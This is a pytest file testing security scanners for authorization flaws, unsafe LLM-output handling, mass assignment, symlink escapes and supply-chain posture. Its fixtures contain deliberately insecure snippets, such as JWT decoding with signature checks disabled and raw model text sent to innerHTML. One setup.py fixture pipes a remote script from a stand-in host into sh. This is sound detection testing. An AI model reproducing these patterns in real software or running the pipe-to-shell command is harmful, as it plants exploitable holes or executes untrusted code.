"""Neutral reproductions for scanner trust, control scope, and posture defects."""

from pathlib import Path

import analyzers.mass_assignment_scanner as M
import analyzers.source_auth_scanner as S
import model.emit_sca_practice as E
import pytest

ROOT = Path(__file__).resolve().parents[1]


def source(tmp_path, code, name="app.ts"):
    p = tmp_path / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(code)
    checks = S.load_checks(ROOT / "data/source-auth-checks.yaml") + S.load_checks(
        ROOT / "data/credential-lifecycle-checks.yaml"
    )
    return {f.check_id for f in S.scan_repo(tmp_path, checks)}


@pytest.mark.parametrize("name", ["output/api.js", "builder/api.js", "src/layout/api.js", "src/api.js"])
def test_application_paths_are_not_build_directories(tmp_path, name):
    assert "AUTHZ-002" in source(tmp_path, "records.findByPk(req.params.id);", name)


def test_real_dependency_directory_is_excluded(tmp_path):
    assert not source(tmp_path, "records.findByPk(req.params.id);", "node_modules/pkg/api.js")


@pytest.mark.parametrize("suffix", [".js", ".ts"])
def test_source_walk_does_not_read_external_symlink(tmp_path, suffix):
    root = tmp_path / "repo"
    root.mkdir()
    outside = tmp_path / ("outside" + suffix)
    outside.write_text("records.findByPk(req.params.id);")
    (root / ("link" + suffix)).symlink_to(outside)
    assert not source(root, "", "empty.js")


@pytest.mark.parametrize(
    "tail",
    [
        "logger.info({ownerId: req.user.id});",
        "function audit(req) { return {ownerId: req.user.id}; }",
        "// requireOwnership(record, req.user.id);",
    ],
)
def test_unrelated_owner_signal_does_not_authorize_query(tmp_path, tail):
    assert "AUTHZ-002" in source(tmp_path, "records.findByPk(req.params.id);\n" + tail)


@pytest.mark.parametrize("name", ["token", "session_token"])
def test_disabled_jwt_verification_overrides_algorithm_counter(tmp_path, name):
    code = f'claims = jwt.decode({name}, key, algorithms=["HS256"], options={{"verify_signature": False}})\n'
    assert "AUTHZ-103" in source(tmp_path, code, "login.py")


def test_verified_jwt_stays_safe(tmp_path):
    assert "AUTHZ-103" not in source(tmp_path, 'jwt.decode(token, key, algorithms=["HS256"])', "login.py")


@pytest.mark.parametrize("guard", ["csrfProtection", "csrf()"])
def test_csrf_is_not_authentication(tmp_path, guard):
    assert "AUTHZ-008" in source(tmp_path, f"app.post('/payments', {guard}, savePayment);")


def test_authentication_guard_stays_safe(tmp_path):
    assert "AUTHZ-008" not in source(tmp_path, "app.post('/payments', requireAuth, savePayment);")


@pytest.mark.parametrize("comment", ["// reset_token unsupported", "/* mfa is not implemented */"])
def test_recovery_comment_is_not_second_factor(tmp_path, comment):
    code = f"if (req.body.securityAnswer === user.securityAnswer) {{\n{comment}\nsetPassword(user, req.body.newPassword);\n}}"
    assert "AUTHN-001" in source(tmp_path, code)


@pytest.mark.parametrize("minimum", [10, 12])
def test_later_strong_password_rejection_is_respected(tmp_path, minimum):
    code = f'function register(password) {{\nif (password.length < 4) throw new Error("short");\nif (password.length < {minimum}) throw new Error("weak");\nsave(password);\n}}'
    assert "AUTHN-002" not in source(tmp_path, code)


LLM = 'import { llm } from "./model";\nconst modelText = (await llm.invoke(prompt)).content;\n'


@pytest.mark.parametrize(
    "body",
    [
        "panel.innerHTML = DOMPurify.sanitize(modelText) + modelText;",
        "const rendered = DOMPurify.sanitize(modelText) + modelText;\npanel.innerHTML = rendered;",
    ],
)
def test_partial_html_sanitization_does_not_hide_raw_value(tmp_path, body):
    assert "INJ-LLM-002" in source(tmp_path, LLM + body)


@pytest.mark.parametrize("guard", ["// assertAllowedUrl(modelText);", "if (false) { assertAllowedUrl(modelText); }"])
def test_nonexecuted_llm_guard_does_not_suppress(tmp_path, guard):
    assert "INJ-LLM-004" in source(tmp_path, LLM + guard + "\nfetch(modelText);")


@pytest.mark.parametrize("field", ["otherUrl", "destination"])
def test_llm_guard_is_property_specific(tmp_path, field):
    code = LLM + f"const choice = JSON.parse(modelText);\nassertAllowedUrl(choice.safeUrl);\nfetch(choice.{field});"
    assert "INJ-LLM-004" in source(tmp_path, code)


@pytest.mark.parametrize("predicate", ["allowedTools.includes", "allowedActions.has"])
def test_ignored_tool_predicate_is_not_enforcement(tmp_path, predicate):
    assert "AUTHZ-LLM-001" in source(
        tmp_path, LLM + f"{predicate}(modelText);\nauthorize(req.user, modelText);\nexecuteTool(modelText);"
    )


def test_ignored_structured_predicates_are_not_validation(tmp_path):
    code = (
        LLM
        + "const decision = JSON.parse(modelText);\ntypeof decision.score;\ndecision.score >= 0;\nallowedActions.includes(decision.action);\napplyDecision(decision);"
    )
    assert "INJ-LLM-001" in source(tmp_path, code)


@pytest.mark.parametrize("parameter", ["modelText", "response"])
def test_function_parameter_shadows_outer_model_variable(tmp_path, parameter):
    code = (
        LLM.replace("modelText", parameter)
        + f'function renderFixed({parameter}) {{\npanel.innerHTML = {parameter};\n}}\nrenderFixed("fixed");'
    )
    assert "INJ-LLM-002" not in source(tmp_path, code)


@pytest.mark.parametrize("field", ["role", "isAdmin"])
def test_field_annotation_does_not_protect_neighbor(field):
    cat = M.load_catalog(ROOT / "data/mass-assignment-signatures.yaml")
    code = f"@Entity\npublic class Account {{\n@JsonIgnore\npublic String password;\npublic String {field};\n}}"
    assert M.discover_entities("Account.java", code, cat)[0].fields == [field]


@pytest.mark.parametrize("typename", ["Account", "Member"])
def test_dto_does_not_collide_with_entity_in_another_package(tmp_path, typename):
    (tmp_path / "Entity.java").write_text(
        f"package domain;\n@Entity\npublic class {typename} {{ public String role; }}"
    )
    (tmp_path / "Dto.java").write_text(f"package api;\npublic class {typename} {{ public String displayName; }}")
    (tmp_path / "Controller.java").write_text(
        f'package api;\npublic class Controller {{\n@PostMapping("/profile")\npublic void save(@RequestBody {typename} body) {{}}\n}}'
    )
    assert not M.scan_repo(tmp_path, M.load_catalog(ROOT / "data/mass-assignment-signatures.yaml"))


def _workflow(tmp_path, body, name="ci.yml"):
    path = tmp_path / ".github/workflows" / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)


@pytest.mark.parametrize("revision", ["main", "develop"])
def test_mutable_branch_alongside_pinned_action(tmp_path, revision):
    _workflow(tmp_path, "steps:\n  - uses: vendor/stable@" + "a" * 40 + f"\n  - uses: vendor/tool@{revision}\n")
    assert E.classify_action_pinning(tmp_path)[0] == "Partial"


@pytest.mark.parametrize("text", ["# npm audit\n", "# pip-audit\n"])
def test_commented_audit_is_not_a_control(tmp_path, text):
    _workflow(tmp_path, "steps:\n  " + text)
    assert E.classify_sca_scanning(tmp_path)[0] == E.NOT_EVIDENCED


def test_job_level_advisory_audit_is_not_blocking(tmp_path):
    _workflow(
        tmp_path, "jobs:\n  audit:\n    continue-on-error: true\n    steps:\n      - run: npm audit\n", "audit.yml"
    )
    assert E.classify_sca_scanning(tmp_path)[0] == "Weak"


@pytest.mark.parametrize("name", ["renovate.json", ".renovaterc.json"])
def test_disabled_renovate_is_not_credited(tmp_path, name):
    (tmp_path / "package.json").write_text("{}")
    (tmp_path / name).write_text('{"enabled": false}')
    assert E.classify_auto_updates(tmp_path, tmp_path)[0] == E.NOT_EVIDENCED


def test_explicit_renovate_manager_covers_npm(tmp_path):
    (tmp_path / "package.json").write_text("{}")
    (tmp_path / "renovate.json").write_text('{"enabledManagers": ["npm"]}')
    assert E.classify_auto_updates(tmp_path, tmp_path)[0] == "Adequate"


def test_partial_hash_file_is_not_full_integrity(tmp_path):
    (tmp_path / "requirements.txt").write_text("first==1 --hash=sha256:" + "a" * 64 + "\nsecond>=2\n")
    assert E.classify_lockfile_hygiene(tmp_path)[0] != "Adequate"


def test_mixed_ecosystem_lock_coverage(tmp_path):
    (tmp_path / "package.json").write_text("{}")
    (tmp_path / "package-lock.json").write_text("{}")
    (tmp_path / "requirements.txt").write_text("library>=1\n")
    assert E.classify_lockfile_hygiene(tmp_path)[0] == "Partial"


@pytest.mark.parametrize("filename", ["requirements.txt", "requirements.lock"])
def test_pip_hash_flag_is_sufficient(tmp_path, filename):
    _workflow(tmp_path, f"steps:\n  - run: pip install --require-hashes -r {filename}\n")
    assert E.classify_ci_install(tmp_path)[0] == "Adequate"


def test_docker_alias_is_local_to_file(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM alpine@sha256:" + "a" * 64 + " AS worker")
    (tmp_path / "Dockerfile.worker").write_text("FROM worker")
    assert E.classify_base_image_pinning(tmp_path)[0] == "Partial"


@pytest.mark.parametrize("platform", ["linux/amd64", "linux/arm64"])
def test_docker_platform_option_is_not_image(tmp_path, platform):
    (tmp_path / "Dockerfile").write_text(f"FROM --platform={platform} alpine@sha256:" + "a" * 64)
    assert E.classify_base_image_pinning(tmp_path)[0] == "Adequate"


def test_later_setup_execution_is_inspected(tmp_path):
    (tmp_path / "setup.py").write_text(
        'import os, subprocess\nsubprocess.run(["python", "--version"])\nos.system("curl https://example.invalid/setup.sh | sh")\n'
    )
    assert E.classify_install_scripts(tmp_path)[0] == "Missing"


@pytest.mark.parametrize("mention", ["logger.info(req.body.resetToken);", 'const feature = "mfa";'])
def test_recovery_factor_mention_does_not_verify(tmp_path, mention):
    code = f"if (req.body.securityAnswer === user.securityAnswer) {{\n{mention}\nsetPassword(user, req.body.newPassword);\n}}"
    assert "AUTHN-001" in source(tmp_path, code)


def test_internal_source_symlink_retains_coverage(tmp_path):
    (tmp_path / "source.js").write_text("records.findByPk(req.params.id);")
    (tmp_path / "alias.js").symlink_to(tmp_path / "source.js")
    assert "AUTHZ-002" in source(tmp_path, "", "empty.js")


def test_fully_hashed_requirements_and_prior_docker_stage_stay_adequate(tmp_path):
    (tmp_path / "requirements.txt").write_text("public-lib==1 --hash=sha256:" + "a" * 64 + "\n")
    assert E.classify_lockfile_hygiene(tmp_path)[0] == "Adequate"
    (tmp_path / "Dockerfile").write_text("FROM alpine@sha256:" + "a" * 64 + " AS builder\nFROM builder\n")
    assert E.classify_base_image_pinning(tmp_path)[0] == "Adequate"


@pytest.mark.parametrize("name", ["service.py", "nested/routes.ts"])
def test_route_and_architecture_walkers_skip_external_source(tmp_path, name):
    import analyzers.architecture_coverage_checks as architecture
    import analyzers.route_inventory as routes

    repo = tmp_path / "repo"
    repo.mkdir()
    outside = tmp_path / "outside"
    outside.write_text("external source")
    link = repo / name
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(outside)
    local = repo / "local.py"
    local.write_text("local source")
    for walk in (architecture._walk_sources, routes._walk_sources):
        assert list(walk(repo)) == [local]


@pytest.mark.parametrize("name", ["linked.py", "nested/symlink.js"])
def test_repo_scan_rejects_local_escaping_symlink(monkeypatch, tmp_path, capsys, name):
    import analyzers.repo_scan as repo_scan

    repo = tmp_path / "repo"
    repo.mkdir()
    outside = tmp_path / "outside"
    outside.write_text("external source")
    link = repo / name
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(outside)
    monkeypatch.setattr(repo_scan, "collect", lambda *args, **kwargs: pytest.fail("unsafe repository scanned"))
    assert repo_scan.main(["--repo", str(repo)]) == 1
    assert "escaping symlink" in capsys.readouterr().err


@pytest.mark.parametrize(
    "suffix,code",
    [
        (
            ".js",
            'function register(password) {\n  if (password.length < 4) {\n    throw new Error("short");\n  }\n  if (password.length < 12) {\n    throw new Error("weak");\n  }\n  save(password);\n}',
        ),
        (
            ".py",
            'def register(password):\n    if len(password) < 4:\n        raise ValueError("short")\n    if len(password) < 12:\n        raise ValueError("weak")\n    save(password)\n',
        ),
    ],
)
def test_multiline_password_rejections_are_sequential(tmp_path, suffix, code):
    assert "AUTHN-002" not in source(tmp_path, code, "registration" + suffix)


def test_optional_stronger_policy_does_not_hide_weak_minimum(tmp_path):
    code = 'function register(password) {\nif (password.length < 4) throw Error("short");\nif (strictMode) {\nif (password.length < 12) throw Error("weak");\n}\nsave(password);\n}'
    assert "AUTHN-002" in source(tmp_path, code)


def test_inline_model_calls_are_sanitized_per_occurrence(tmp_path):
    code = 'import { llm } from "./model";\npanel.innerHTML = DOMPurify.sanitize(await llm.invoke(prompt)) + await llm.invoke(otherPrompt);'
    assert "INJ-LLM-002" in source(tmp_path, code)
